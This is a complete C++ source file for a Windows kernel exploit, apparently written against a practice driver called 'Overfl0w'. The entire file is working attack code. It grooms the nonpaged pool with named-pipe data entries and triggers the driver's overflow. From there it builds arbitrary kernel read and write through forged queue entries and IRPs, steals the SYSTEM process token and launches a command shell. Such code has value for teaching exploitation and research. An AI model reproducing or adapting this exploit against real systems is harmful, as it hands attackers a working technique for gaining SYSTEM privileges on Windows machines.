#include <iostream>
#include <Windows.h>
#include <winternl.h>
#include <vector>

#pragma optimize("", off)

#define NP_HEADER_SIZE 0x30
#define FIRST_ENTRY_SIZE (0x2000-NP_HEADER_SIZE) //FIRST_ENTRY is not very important
#define SECOND_ENTRY_SIZE (0x4000-NP_HEADER_SIZE)
#define THIRD_ENTRY_SIZE (0x2d0-0x10-NP_HEADER_SIZE)
#define ARBITRARY_WRITE_SIZE 8

#define USER_DATA_ENTRY_ADDR ((long long)0x291<<32)
#define TOTAL_DATA_SIZE (FIRST_ENTRY_SIZE+SECOND_ENTRY_SIZE+THIRD_ENTRY_SIZE)

#define IRP_BUFFERED_IO                 0x00000010
#define IRP_DEALLOCATE_BUFFER           0x00000020
#define IRP_INPUT_OPERATION             0x00000040

#define assert(e) do {if(!(e)){printf("Assertion failed at line %d: %s\n", __LINE__ , #e);Sleep(-1);}} while(0)

typedef void (IO_APC_ROUTINE)(
    void* ApcContext,
    IO_STATUS_BLOCK* IoStatusBlock,
    unsigned long    reserved
    );

typedef int(__stdcall* NTFSCONTROLFILE)(
    HANDLE           fileHandle,
    HANDLE           event,
    IO_APC_ROUTINE* apcRoutine,
    void* ApcContext,
    IO_STATUS_BLOCK* ioStatusBlock,
    unsigned long    FsControlCode,
    void* InputBuffer,
    unsigned long    InputBufferLength,
    void* OutputBuffer,
    unsigned long    OutputBufferLength
    );

typedef struct {
    SHORT Type;
    USHORT Size;
    PVOID MdlAddress;
    ULONG Flags;
    PVOID AssociatedIrp;
    LIST_ENTRY ThreadListEntry;
    IO_STATUS_BLOCK IoStatus;
    CHAR RequestorMode;
    BOOLEAN PendingReturned;
    CHAR StackCount;
    CHAR CurrentLocation;
    BOOLEAN Cancel;
    UCHAR CancelIrql;
    CCHAR ApcEnvironment;
    UCHAR AllocationFlags;
    PVOID UserIosb;
    PVOID UserEvent;
    char Overlay[16];
    PVOID CancelRoutine;
    PVOID UserBuffer;
    CHAR TailIsWrong;
} IRP;

typedef struct {
    uint64_t Flink;
    uint64_t Blink;
    IRP* Irp;
    uint64_t SecurityContext;
    uint32_t EntryType;
    uint32_t QuotaInEntry;
    uint32_t DataSize;
    uint32_t x;
} DATA_QUEUE_ENTRY;


typedef struct {
    HANDLE Read;
    HANDLE Write;
} PIPE_HANDLES;


/////////////////////////////////////

using namespace std;

enum {
    EPROCESS_PID = 0, EPROCESS_TOKEN, EPROCESS_THREADLISTHEAD
};

//EPROCESS offsets to target 1709+
uint64_t c_offsets[][3] = {
    {0x2e0, 0x358, 0x488},
    {0x440, 0x4b8, 0x5e0}
};
int g_setoff = 0;
PIPE_HANDLES* g_victim_pipe = 0;

/////////////////////////////////////

void DriverCall(size_t size) {
    HANDLE h = CreateFile(L"\\\\.\\Overfl0w", GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
    DeviceIoControl(h, 0x222004, &size, sizeof(size), 0, 0, 0, 0);
}

void PrepareDataEntryForRead(DATA_QUEUE_ENTRY* dqe, IRP* irp, uint64_t read_address) {
    memset(dqe, 0, sizeof(DATA_QUEUE_ENTRY));
    dqe->EntryType = 1;
    dqe->DataSize = -1;
    dqe->Irp = irp;
    irp->AssociatedIrp = (PVOID)read_address;
}

void PrepareWriteIRP(IRP* irp, PVOID thread_list, PVOID source_address, PVOID destination_address) {
    irp->Flags |= IRP_BUFFERED_IO | IRP_INPUT_OPERATION;
    irp->AssociatedIrp = source_address;
    irp->UserBuffer = destination_address;
    irp->ThreadListEntry.Flink = (LIST_ENTRY*)(thread_list);
    irp->ThreadListEntry.Blink = (LIST_ENTRY*)(thread_list);
}

void PrepareDataEntryForWrite(DATA_QUEUE_ENTRY* dqe, IRP* irp, uint32_t size) {
    memset(dqe, 0, sizeof(DATA_QUEUE_ENTRY));
    dqe->Flink = (uint64_t)dqe;
    dqe->EntryType = 0;
    dqe->DataSize = size;
    dqe->Irp = irp;
}


DWORD WINAPI ThreadedWriter(void* arg) {
    char* buf = (char*)arg;
    DWORD res;

    WriteFile(g_victim_pipe->Write, buf, FIRST_ENTRY_SIZE, &res, NULL);

    Sleep(-1);
    return 0;
}

void ReadMem(uint64_t addr, size_t len, char* data) {
    static char* buf = (char*)malloc(TOTAL_DATA_SIZE + 1 + 0x5000);
    DATA_QUEUE_ENTRY* dqe = (DATA_QUEUE_ENTRY*)USER_DATA_ENTRY_ADDR;
    DWORD read;

    assert(len < 0x5000);

    PrepareDataEntryForRead(dqe, (IRP*)(USER_DATA_ENTRY_ADDR + 0x1000), addr);
    PeekNamedPipe(g_victim_pipe->Read, buf, TOTAL_DATA_SIZE + 1 + len, &read, 0, 0);
    memcpy(data, buf + TOTAL_DATA_SIZE + 1, len);
}

uint64_t GetProcessById(uint64_t first_process, uint64_t pid) {
    uint64_t current_pid = 0;
    uint64_t current_process = first_process;
    while (1) {
        ReadMem(current_process + c_offsets[g_setoff][EPROCESS_PID], 8, (char*)&current_pid);
        if (current_pid == pid)
            return current_process;

        ReadMem(current_process + c_offsets[g_setoff][EPROCESS_PID] + 8, 8, (char*)&current_process);
        current_process -= c_offsets[g_setoff][EPROCESS_PID] + 8;

        if (current_process == first_process)
            return 0;
    }
}

void main() {
    NTFSCONTROLFILE NtFsControlFile = (NTFSCONTROLFILE)GetProcAddress(LoadLibrary(L"ntdll.dll"), "NtFsControlFile");
    HANDLE r, w;
    DWORD res;
    std::vector<PIPE_HANDLES> pipe_pool, free_pipe_pool;
    IO_STATUS_BLOCK isb;

    char* buf = (char*)malloc(TOTAL_DATA_SIZE * 2);

    assert(ARBITRARY_WRITE_SIZE < FIRST_ENTRY_SIZE + SECOND_ENTRY_SIZE);

    if (VirtualAlloc((PVOID)USER_DATA_ENTRY_ADDR, 0x6000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE) != (PVOID)USER_DATA_ENTRY_ADDR) {
        printf("Couldn't allocate base address %p\n", USER_DATA_ENTRY_ADDR);
        return;
    }

    for (int i = 0; i < 1001; i++) {
        w = CreateNamedPipe(
            L"\\\\.\\pipe\\exploit_0",
            PIPE_ACCESS_OUTBOUND | FILE_FLAG_OVERLAPPED,
            PIPE_TYPE_BYTE | PIPE_WAIT,
            PIPE_UNLIMITED_INSTANCES,
            TOTAL_DATA_SIZE,
            TOTAL_DATA_SIZE,
            0,
            NULL);
        r = CreateFile(L"\\\\.\\pipe\\exploit_0", GENERIC_READ, 0, 0, OPEN_EXISTING, 0, 0);
        if (i < 1000)
            pipe_pool.push_back({ r, w });
        else
            free_pipe_pool.push_back({ r, w });
    }


    printf("Creating the left entries\n");
    for (auto& p : pipe_pool) {
        WriteFile(p.Write, buf, FIRST_ENTRY_SIZE, &res, 0);
    }


    printf("Creating the middle entries\n");
    auto free_pipe = free_pipe_pool.begin();
    for (int i = 0; i < pipe_pool.size(); i++) {
        WriteFile(pipe_pool[i].Write, buf, SECOND_ENTRY_SIZE, &res, 0);
        if (i > 900 && i < pipe_pool.size() - 10 && i % 4 == 0 && free_pipe != free_pipe_pool.end()) {
            WriteFile(free_pipe->Write, buf, SECOND_ENTRY_SIZE, &res, 0);
            free_pipe++;
        }
    }

    printf("Creating the RIGHT entries\n");
    char victim_data[THIRD_ENTRY_SIZE];
    memset(victim_data, 0, sizeof(victim_data));

    /*
    ideally we want 5 THIRD_ENTRY_SIZE blocks in a single page.
    if our 5 chunks are the only residents of that page, then their
    least significant bytes will be known and so we can calculate
    where the trimmed Flink will point after the overflow.
    Since the first entry will always have its least significant byte be 0x10
    then this approach can theoretically be 80% reliable.

    Another simple but probably more reliable approach:
    [PAGE_BOUNDARY][~0x900 chunk][~0x500 chunk]
    ~0x900: size can be anything big enough to be at the page boundary, allocated from pipe_group_1
    ~0x500: another chunk that we expect to be placed afterwards, allocated from pipe_group_2
    the forged entry would be stored in one of the pipe_group_1 entries
    the overflown entry would be held within one of the pipe_group_2 entries
    */
    int dqe_offsets[] = { 0x1c0, 0x1e0, 0x200, 0x220 };
    DATA_QUEUE_ENTRY* dqe;
    for (int i = 0; i < sizeof(dqe_offsets) / sizeof(*dqe_offsets); i++) {
        dqe = (DATA_QUEUE_ENTRY*)(victim_data + dqe_offsets[i]);
        dqe->Flink = USER_DATA_ENTRY_ADDR;
        dqe->Irp = (IRP*)USER_DATA_ENTRY_ADDR;
        dqe->EntryType = 0;
        dqe->QuotaInEntry = THIRD_ENTRY_SIZE + 1;
        dqe->DataSize = THIRD_ENTRY_SIZE + 1;
    }


    ((IRP*)(USER_DATA_ENTRY_ADDR))->CancelRoutine = 0;

    for (int i = 0; i < pipe_pool.size(); i++) {
        WriteFile(pipe_pool[i].Write, victim_data, THIRD_ENTRY_SIZE, &res, 0);
    }

    printf("Creating holes in the middle entries\n");
    for (auto& p : free_pipe_pool) {
        ReadFile(p.Read, buf, SECOND_ENTRY_SIZE, &res, 0);
    }

    printf("Calling the vulnerable function\n");
    DriverCall(SECOND_ENTRY_SIZE + NP_HEADER_SIZE);

    DWORD bytes_read;

    for (auto& p : pipe_pool) {
        PeekNamedPipe(p.Read, buf, TOTAL_DATA_SIZE + 1, &bytes_read, 0, 0);
        if (bytes_read == TOTAL_DATA_SIZE + 1) {
            g_victim_pipe = &p;
            printf("Overflown data entry found\n");
            break;
        }
    }

    if (!g_victim_pipe) {
        printf("Couldn't find an overflown data entry, expect a bsod\n");
        Sleep(-1);
    }

    DATA_QUEUE_ENTRY* current_chunk_flink;

    for (int i = 0; i < THIRD_ENTRY_SIZE; i += 8) {
        current_chunk_flink = (DATA_QUEUE_ENTRY*)*(uint64_t*)&buf[FIRST_ENTRY_SIZE + SECOND_ENTRY_SIZE + i];
        if (((uint64_t)current_chunk_flink >> 32) == 0x7246704E) {
            current_chunk_flink = (DATA_QUEUE_ENTRY*)*(uint64_t*)&buf[FIRST_ENTRY_SIZE + SECOND_ENTRY_SIZE + i + 8 * 2];
            break;
        }
    }
    printf("Leaked Flink of current chunk: %p\n", current_chunk_flink);

    uint64_t current_chunk_addr;
    ReadMem((uint64_t)&current_chunk_flink->Blink, 8, (char*)&current_chunk_addr);

    printf("Address of current chunk: %p\n", current_chunk_addr);

    printf("Creating an entry with size greater than the available pipe quota\n");
    CreateThread(0, 0, ThreadedWriter, buf, 0, 0);  //we could have used overlapped/completion routines
    Sleep(2000);

    uint64_t next_entry, irp_addr;
    ReadMem(current_chunk_addr, 8, (char*)&next_entry);
    printf("Address of created entry: %p\n", next_entry);

    ReadMem(next_entry + offsetof(DATA_QUEUE_ENTRY, Irp), 8, (char*)&irp_addr);
    printf("Created entry IRP: %p\n", irp_addr);

    char irp_data[0x1000];
    ReadMem(irp_addr, 0x1000, irp_data);
    IRP* irp = (IRP*)irp_data;

    uint64_t cp_thread_list_head, current_process, currentProcessPID, system_process;

    //&((ETHREAD*)0)->ThreadListHead.Flink-&((EHREAD)*0)->IrpList=0x38, remains constant between most recent builds
    ReadMem((uint64_t)irp->ThreadListEntry.Flink + 0x38, 8, (char*)&cp_thread_list_head);
    current_process = cp_thread_list_head - c_offsets[g_setoff][EPROCESS_THREADLISTHEAD];
    ReadMem(current_process + c_offsets[g_setoff][EPROCESS_PID], 8, (char*)&currentProcessPID);
    if (currentProcessPID != GetCurrentProcessId())
        g_setoff++;

    current_process = cp_thread_list_head - c_offsets[g_setoff][EPROCESS_THREADLISTHEAD];

    system_process = GetProcessById(current_process, 4);
    printf("Found current process: %p system process: %p\n", current_process, system_process);

    uint64_t thread_list[2];
    PrepareWriteIRP(irp, thread_list, (PVOID)(system_process + c_offsets[g_setoff][EPROCESS_TOKEN]), (PVOID)(current_process + c_offsets[g_setoff][EPROCESS_TOKEN]));

    NtFsControlFile(g_victim_pipe->Write, 0, 0, 0, &isb, 0x119FF8, irp, 0x1000, 0, 0);

    uint64_t unbuffered_entry, unbuffered_irp_addr, forged_irp_addr;
    ReadMem(next_entry, 8, (char*)&unbuffered_entry);
    printf("Data entry that holds the forged IRP: %p\n", unbuffered_entry);

    ReadMem(unbuffered_entry + offsetof(DATA_QUEUE_ENTRY, Irp), 8, (char*)&unbuffered_irp_addr);
    printf("Data entry IRP address: %p\n", unbuffered_irp_addr);

    ReadMem(unbuffered_irp_addr + offsetof(IRP, AssociatedIrp), 8, (char*)&forged_irp_addr);

    printf("Forged IRP address: %p\n", forged_irp_addr);
    dqe = (DATA_QUEUE_ENTRY*)USER_DATA_ENTRY_ADDR;
    PrepareDataEntryForWrite(dqe, (IRP*)forged_irp_addr, ARBITRARY_WRITE_SIZE);

    thread_list[0] = thread_list[1] = forged_irp_addr + offsetof(IRP, ThreadListEntry.Flink);

    printf("Triggering a call to IofCompleteRequest with our forged IRP and overwriting our token\n\n");
    ReadFile(g_victim_pipe->Read, buf, ARBITRARY_WRITE_SIZE, &res, 0);
    Sleep(200);

    system("cmd");
}